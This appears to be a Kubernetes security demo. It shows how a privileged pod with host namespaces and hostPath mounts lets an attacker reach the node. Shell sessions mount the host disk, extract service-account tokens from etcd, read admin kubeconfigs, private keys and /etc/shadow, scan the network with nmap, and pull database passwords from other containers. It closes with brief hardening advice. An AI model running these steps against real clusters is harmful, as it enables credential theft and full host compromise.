# First What a Hacker Would Do

Run a pod with elevated permissions:
- [privileged](https://kubernetes.io/docs/concepts/policy/pod-security-policy/#privileged) (access to all devices on the host)
- [host namespaces](https://kubernetes.io/docs/concepts/policy/pod-security-policy/#host-namespaces) (HostPID, HostIPC, HostNetwork, HostPorts)
- [host volumes](https://kubernetes.io/docs/concepts/policy/pod-security-policy/#volumes-and-file-systems) (mount host volumes into the pod)

---
![K8s threat matrix](../static/01-k8s-matrix.png)
*Kubernetes threat matrix for a generic attack involving privileged pods*

---

## kubectl ssh node

Recommended to check out:

- A great GitHub repo [BishopFox/badPods](https://github.com/BishopFox/badPods/) with detailed analysis of possible attacks with given priveleges
- [in Russian] [YouTube video](https://www.youtube.com/watch?v=Ik7VqbgpRiQ) Заделываем дыры в кластере Kubernetes / Павел Селиванов (Southbridge)
- A [kubectl plugin](https://github.com/luksa/kubectl-plugins) `kubectl ssh node` by Marko Lukša (the author of the K8s bible [Kubernetes in Action](https://www.manning.com/books/kubernetes-in-action))


## Quick demo

### Attack description:
- **Setup**: a K8s cluster
- **Attacker**: a user with kubectl access to the cluster
  - permission to run a pod (alternatively: a deployment, a replicaset, a job, etc)
  - permissions enforced by `PodSecurityPolicy` or an admission controller (allowed by default):
    - `securityContext.privileged: true`
    - `hostPath: ...`
    - `hostNetwork: true`
    - `hostPID: true`
    - `hostIPC: true`
  - permissions to do `kube-exec` (not required: alternatively run a [reverse shell pod](https://github.com/BishopFox/badPods/tree/main/manifests/everything-allowed#reverse-shell-pods))
- **Target**: K8s cluster
- **Entrypoint**: Kube API (kubectl)


### Run a privileged pod and connect:
```
k create ns privileged-pods
k -n privileged-pods apply -f pod-privileged.yaml
k -n privileged-pods wait --for=condition=Ready pod/pod-privileged
k -n privileged-pods attach -it pod-privileged -c main
```


### Access node's devices (`privileged: true`)
```
[root@seck8s /]# blkid
/dev/sr0: UUID="2021-10-07-14-09-43-00" LABEL="config-2" TYPE="iso9660"
/dev/sda1: LABEL="cloudimg-rootfs" UUID="65fe7266-66aa-4715-9f5b-d9d61e84dac3" TYPE="ext4" PARTLABEL="root" PARTUUID="00000000-0000-0000-0000-000000000000"
/dev/sda14: PARTLABEL="BSP" PARTUUID="57facf1b-74e9-44bc-8327-81da6971a54f"

[root@seck8s /]# mount /dev/sda1 /mnt
[root@seck8s /]# ls /mnt
artem  bin  boot  dev  etc  home  lib  lib64  lost+found  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var


$ [root@seck8s /]# strings /mnt/var/lib/etcd/member/snap/db
</registry/configmaps/ingress-nginx/ingress-controller-leader
	ConfigMap
ingress-controller-leader
ingress-nginx"
*$7ee985cf-1dfa-497e-bbe7-ae34871846862
(control-plane.alpha.kubernetes.io/leader
{"holderIdentity":"ingress-nginx-controller-7df6786c74-gj5c8","leaseDurationSeconds":30,"acquireTime":"2021-10-07T14:45:10Z","renewTime":"2021-10-13T10:16:19Z","leaderTransitions":0}z
nginx-ingress-controller
Update
...
```

Print all etcd secrets (exploit taken from [here](https://github.com/BishopFox/badPods/blob/main/manifests/priv/README.md#mount-the-hosts-filesystem)):
```
[root@seck8s /]# db=`strings /mnt/var/lib/etcd/member/snap/db`; for x in `echo "$db" | grep eyJhbGciOiJ`; do name=`echo "$db" | grep $x -B40 | grep registry`; echo $name \| $x; echo; done
B/registry/secrets/kube-system/resourcequota-controller-token-7q9bd | eyJhbGciOiJSUzI1NiIsImtpZ...
...
```



### Access node's file system (`hostPath: ...`)

Admin config for `kubectl`:
```
[root@seck8s /]# ls -l ~/.kube/config
-rw------- 1 root root 5670 Oct  7 14:28 /root/.kube/config


[root@seck8s /]# kubectl config view
apiVersion: v1
clusters:
- cluster:
    certificate-authority-data: DATA+OMITTED
    server: https://188.2***:6443
  name: kubernetes
contexts:
- context:
    cluster: kubernetes
    namespace: ingress-nginx
    user: kubernetes-admin
  name: kubernetes-admin@kubernetes
current-context: kubernetes-admin@kubernetes
kind: Config
preferences: {}
users:
- name: kubernetes-admin
  user:
    client-certificate-data: REDACTED
    client-key-data: REDACTED
```

Kubernetes node-specific secrets:
```
[root@pod-privileged /]# tree /etc/kubernetes/
/etc/kubernetes/
├── admin.conf
├── controller-manager.conf
├── kubelet.conf
├── manifests
│   ├── etcd.yaml
│   ├── kube-apiserver.yaml
│   ├── kube-controller-manager.yaml
│   └── kube-scheduler.yaml
├── pki
│   ├── apiserver.crt
│   ├── apiserver-etcd-client.crt
│   ├── apiserver-etcd-client.key
│   ├── apiserver.key
│   ├── apiserver-kubelet-client.crt
│   ├── apiserver-kubelet-client.key
│   ├── ca.crt
│   ├── ca.key
│   ├── etcd
│   │   ├── ca.crt
│   │   ├── ca.key
│   │   ├── healthcheck-client.crt
│   │   ├── healthcheck-client.key
│   │   ├── peer.crt
│   │   ├── peer.key
│   │   ├── server.crt
│   │   └── server.key
│   ├── front-proxy-ca.crt
│   ├── front-proxy-ca.key
│   ├── front-proxy-client.crt
│   ├── front-proxy-client.key
│   ├── sa.key
│   └── sa.pub
└── scheduler.conf


[root@seck8s /]# cat /etc/kubernetes/admin.conf  # admin .kube/conf
apiVersion: v1
clusters:
- cluster:
    certificate-authority-data: LS0tLS1CRUdJTiBDRVJUSUZJQ0FURS0...
...


[root@seck8s /]# cat /etc/kubernetes/pki/apiserver-kubelet-client.key
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAztB7nKjUifTPtU0FwUsqGFZYRB3mYC/vCSP1pcjibrzoAO6W
Fy43LHOQpuvCi36XuV21dPBKfsxjDlwdm7pxDtCyV/WRe8WMpvhhRYvlhL5JSaPY
...
```

Other infra configurations: Ansible, Calico, etc.
```
[root@pod-privileged /]# cat /srv/southbridge/etc/sb-iptables-base.conf
# THIS FILE IS MANAGED BY ANSIBLE, ALL CHANGES WILL BE LOST

# zabbix.southbridge.ru
136.24...


[root@pod-privileged /]# cat /etc/cni/net.d/calico-kubeconfig
# Kubeconfig file for Calico CNI plugin.
apiVersion: v1
kind: Config
clusters:
- name: local
  cluster:
    server: https://[10.96***.1]:443
    certificate-authority-data: LS0tLS1CRUdJTiBDRVJUSUZJQ0FURS0tLS0tCk1J...
...
```


Other sensitive data stored on the node:
```
[root@pod-privileged /]# tree /home -a
/home
├── a.likha****v
│   ├── .bash_logout
│   ├── .bash_profile
│   ├── .bashrc
│   └── .ssh
│       └── authorized_keys
├── a.mukhame***v
│   ├── .bash_logout
...


[root@seck8s /]# ls ~/.ssh/
authorized_keys  config  id_rsa  id_rsa.pub  known_hosts


[root@seck8s /]# ls /etc/ssh/
moduli	    sshd_config       ssh_host_dsa_key.pub  ssh_host_ecdsa_key.pub  ssh_host_ed25519_key.pub  ssh_host_rsa_key.pub
ssh_config  ssh_host_dsa_key  ssh_host_ecdsa_key    ssh_host_ed25519_key    ssh_host_rsa_key


[root@seck8s /]# cat /etc/shadow
root:$6$auLWtuo4$P5KzOLL***Kd9erMv1fApzm58Htlgg.bLH0g.3U0***E/Gj6Q***QJf0:18907:0:99999:7:::
bin:*:17110:0:99999:7:::
daemon:*:17110:0:99999:7:::
...
m.ib***:$6$7STGX1cP$.F2RKy***LZ5udh9BJ9.u/XxxUynbhFHRl6k***auagppoOfTRPHMc8o0:18855:0:99999:7:::
...
```

Sudoers is writeable:
```
[root@pod-privileged /artem]# echo "  " >> /etc/sudoers
```


### Access node's network interfaces (`hostNetwork: true`)
```
[root@seck8s /]# ifconfig
...
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 188.246.***.0  netmask 255.255.255.248  broadcast 188.246.2***
        ether fa:16:3e:***  txqueuelen 1000  (Ethernet)
        RX packets 2503451  bytes 1816731848 (1.6 GiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 715727  bytes 151818416 (144.7 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
...


[root@seck8s /]# yum install nmap
...

[root@seck8s /]# nmap 188.246.***.0/24

Starting Nmap 6.40 ( http://nmap.org ) at 2021-10-13 10:18 UTC
Stats: 0:00:48 elapsed; 4 hosts completed (3 up), 3 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 51.57% done; ETC: 10:23 (0:00:45 remaining)
...

Nmap scan report for 188.246***.0
Host is up (0.00025s latency).
Not shown: 990 closed ports
PORT     STATE    SERVICE
22/tcp   open     ssh
111/tcp  filtered rpcbind
5900/tcp filtered vnc
5901/tcp filtered vnc-1
5902/tcp filtered vnc-2
5903/tcp filtered vnc-3
5904/tcp filtered unknown
5906/tcp filtered unknown
5907/tcp filtered unknown
5910/tcp filtered cm
MAC Address: FA:16:3E:5F:*** (Unknown)

Nmap scan report for 188.246.***
Host is up (0.00023s latency).
Not shown: 999 closed ports
PORT   STATE    SERVICE
22/tcp filtered ssh
MAC Address: FA:16:3E:28:*** (Unknown)
...
```


### Access node's processes (`hostPID: true`)
```
[root@seck8s /]# ps aux | grep kube
nix       2085  0.0  0.3 1097052 50460 ?       Ssl  Oct11   0:27 /usr/local/bin/python -m kube_web --port=8080 --show-container-logs
root     12256  1.4  0.7 824056 124268 ?       Ssl  Oct07 120:32 kube-controller-manager --allocate-node-cidrs=true --authentication-kubeconfig=/etc/kubernetes/controller-manager.conf --authorization-kubeconfig=/etc/kubernetes/controller-manager.conf --bind-address=127.0.0.1 --client-ca-file=/etc/kubernetes/pki/ca.crt --cluster-cidr=10.2**.0.0/16 --cluster-name=kubernetes --cluster-signing-cert-file=/etc/kubernetes/pki/ca.crt --cluster-signing-key-file=/etc/kubernetes/pki/ca.key --controllers=*,bootstrapsigner,tokencleaner --kubeconfig=/etc/kubernetes/controller-manager.conf --leader-elect=true --port=0 --requestheader-client-ca-file=/etc/kubernetes/pki/front-proxy-ca.crt --root-ca-file=/etc/kubernetes/pki/ca.crt --service-account-private-key-file=/etc/kubernetes/pki/sa.key --service-cluster-ip-range=10.96***/12 --use-service-account-credentials=true
root     12263  1.2  0.4 11215796 81424 ?      Ssl  Oct07 101:52 etcd --advertise-client-urls=https://188.246***:2379 --cert-file=/etc/kubernetes/pki/etcd/server.crt --client-cert-auth=true --data-dir=/var/lib/etcd --initial-advertise-peer-urls=https://188.246***:2380 --initial-cluster=seck8s=https://188.246***:2380 --key-file=/etc/kubernetes/pki/etcd/server.key --listen-client-urls=https://127.0.0.1:2379,https://188.246***:2379 --listen-metrics-urls=http://127.0.0.1:2381 --listen-peer-urls=https://188.246***:2380 --name=seck8s --peer-cert-file=/etc/kubernetes/pki/etcd/peer.crt --peer-client-cert-auth=true --peer-key-file=/etc/kubernetes/pki/etcd/peer.key --peer-trusted-ca-file=/etc/kubernetes/pki/etcd/ca.crt --snapshot-count=10000 --trusted-ca-file=/etc/kubernetes/pki/etcd/ca.crt
root     12270  0.2  0.3 754532 63176 ?        Ssl  Oct07  19:51 kube-scheduler --authentication-kubeconfig=/etc/kubernetes/scheduler.conf --authorization-kubeconfig=/etc/kubernetes/scheduler.conf --bind-address=127.0.0.1 --kubeconfig=/etc/kubernetes/scheduler.conf --leader-elect=true --port=0
root     12272  5.4  2.3 1179884 389876 ?      Ssl  Oct07 456:25 kube-apiserver --advertise-address=188.24*** --allow-privileged=true --authorization-mode=Node,RBAC --client-ca-file=/etc/kubernetes/pki/ca.crt --enable-admission-plugins=NodeRestriction --enable-bootstrap-token-auth=true --etcd-cafile=/etc/kubernetes/pki/etcd/ca.crt --etcd-certfile=/etc/kubernetes/pki/apiserver-etcd-client.crt --etcd-keyfile=/etc/kubernetes/pki/apiserver-etcd-client.key --etcd-servers=https://127.0.0.1:2379 --kubelet-client-certificate=/etc/kubernetes/pki/apiserver-kubelet-client.crt --kubelet-client-key=/etc/kubernetes/pki/apiserver-kubelet-client.key --kubelet-preferred-address-types=InternalIP,ExternalIP,Hostname --proxy-client-cert-file=/etc/kubernetes/pki/front-proxy-client.crt --proxy-client-key-file=/etc/kubernetes/pki/front-proxy-client.key --requestheader-allowed-names=front-proxy-client --requestheader-client-ca-file=/etc/kubernetes/pki/front-proxy-ca.crt --requestheader-extra-headers-prefix=X-Remote-Extra- --requestheader-group-headers=X-Remote-Group --requestheader-username-headers=X-Remote-User --secure-port=6443 --service-account-issuer=https://kubernetes.default.svc.cluster.local --service-account-key-file=/etc/kubernetes/pki/sa.pub --service-account-signing-key-file=/etc/kubernetes/pki/sa.key --service-cluster-ip-range=10.96.***/12 --tls-cert-file=/etc/kubernetes/pki/apiserver.crt --tls-private-key-file=/etc/kubernetes/pki/apiserver.key
root     12365  2.5  1.0 1882772 173092 ?      Ssl  Oct07 211:17 /usr/bin/kubelet --bootstrap-kubeconfig=/etc/kubernetes/bootstrap-kubelet.conf --kubeconfig=/etc/kubernetes/kubelet.conf --config=/var/lib/kubelet/config.yaml --container-runtime=remote --container-runtime-endpoint=/run/containerd/containerd.sock --pod-infra-container-image=k8s.gcr.io/pause:3.5
root     12481  0.0  0.2 748212 47612 ?        Ssl  Oct07   1:10 /usr/local/bin/kube-proxy --config=/var/lib/kube-proxy/config.conf --hostname-override=seck8s
root     15698  0.0  0.0 112820  2396 ?        R+   09:56   0:00 grep --color=auto kube
polkitd  20485  0.0  0.3 746052 49432 ?        Ssl  Oct07   1:57 /usr/bin/kube-controllers
```

Access the container runtime (Container Runtime Interface - CRI):
```
[root@seck8s /]# cat /etc/crictl.yaml
runtime-endpoint: unix:///var/run/containerd/containerd.sock
image-endpoint: unix:///var/run/containerd/containerd.sock
timeout: 30
debug: false


[root@seck8s /]# crictl ps
CONTAINER ID        IMAGE               CREATED             STATE               NAME                      ATTEMPT             POD ID
194bcb7eb9488       16ea53ea7c652       32 minutes ago      Running             main                      0                   49c3068b17f3d
12ffa242158ce       79b3d05b330c1       24 hours ago        Running             not-a-miner               0
...


[root@seck8s /]# mysql_container=$(crictl ps --name=mysql -q)


[root@seck8s /]# crictl exec -i -t $mysql_container sh -c 'env | sort | grep PASSWORD'
MYSQL_PASSWORD=c2VjcmV0cGFzc3dvcmQ=
MYSQL_ROOT_PASSWORD=UEBzc3cwcmQ=
```


## Cleanup
```sh
k -n privileged-pods delete -f pod-privileged.yaml
k delete ns privileged-pods
```

## Takeaways
- Consider hardening your Kubernetes cluster with [PodSecurityPolicy](https://kubernetes.io/docs/concepts/policy/pod-security-policy/) ([deprecated](https://kubernetes.io/blog/2021/04/06/podsecuritypolicy-deprecation-past-present-and-future/) since April 6, 2021) or [Admission Controllers](https://kubernetes.io/blog/2019/03/21/a-guide-to-kubernetes-admission-controllers/)
